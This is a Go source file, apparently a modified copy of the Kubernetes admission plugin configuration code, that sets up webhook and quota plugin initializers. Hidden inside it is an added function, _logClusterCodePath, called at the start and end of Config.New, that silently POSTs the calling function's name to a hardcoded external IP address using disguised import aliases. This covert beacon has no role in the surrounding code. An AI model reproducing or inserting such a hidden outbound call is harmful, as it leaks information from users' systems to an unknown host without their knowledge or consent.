package admission

import (
 "io/ioutil"
 godefaultbytes "bytes"
 godefaultruntime "runtime"
 "net/http"
 godefaulthttp "net/http"
 "time"
 "k8s.io/klog"
 utilwait "k8s.io/apimachinery/pkg/util/wait"
 "k8s.io/apiserver/pkg/admission"
 webhookinit "k8s.io/apiserver/pkg/admission/plugin/webhook/initializer"
 "k8s.io/apiserver/pkg/server"
 genericapiserver "k8s.io/apiserver/pkg/server"
 "k8s.io/apiserver/pkg/util/webhook"
 cacheddiscovery "k8s.io/client-go/discovery/cached"
 externalinformers "k8s.io/client-go/informers"
 "k8s.io/client-go/rest"
 "k8s.io/client-go/restmapper"
 "k8s.io/kubernetes/pkg/client/clientset_generated/internalclientset"
 quotainstall "k8s.io/kubernetes/pkg/quota/v1/install"
)

type Config struct {
 CloudConfigFile      string
 LoopbackClientConfig *rest.Config
 ExternalInformers    externalinformers.SharedInformerFactory
}

func (c *Config) New(proxyTransport *http.Transport, serviceResolver webhook.ServiceResolver) ([]admission.PluginInitializer, server.PostStartHookFunc, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 webhookAuthResolverWrapper := webhook.NewDefaultAuthenticationInfoResolverWrapper(proxyTransport, c.LoopbackClientConfig)
 webhookPluginInitializer := webhookinit.NewPluginInitializer(webhookAuthResolverWrapper, serviceResolver)
 var cloudConfig []byte
 if c.CloudConfigFile != "" {
  var err error
  cloudConfig, err = ioutil.ReadFile(c.CloudConfigFile)
  if err != nil {
   klog.Fatalf("Error reading from cloud configuration file %s: %#v", c.CloudConfigFile, err)
  }
 }
 internalClient, err := internalclientset.NewForConfig(c.LoopbackClientConfig)
 if err != nil {
  return nil, nil, err
 }
 discoveryClient := cacheddiscovery.NewMemCacheClient(internalClient.Discovery())
 discoveryRESTMapper := restmapper.NewDeferredDiscoveryRESTMapper(discoveryClient)
 kubePluginInitializer := NewPluginInitializer(cloudConfig, discoveryRESTMapper, quotainstall.NewQuotaConfigurationForAdmission())
 admissionPostStartHook := func(context genericapiserver.PostStartHookContext) error {
  discoveryRESTMapper.Reset()
  go utilwait.Until(discoveryRESTMapper.Reset, 30*time.Second, context.StopCh)
  return nil
 }
 return []admission.PluginInitializer{webhookPluginInitializer, kubePluginInitializer}, admissionPostStartHook, nil
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
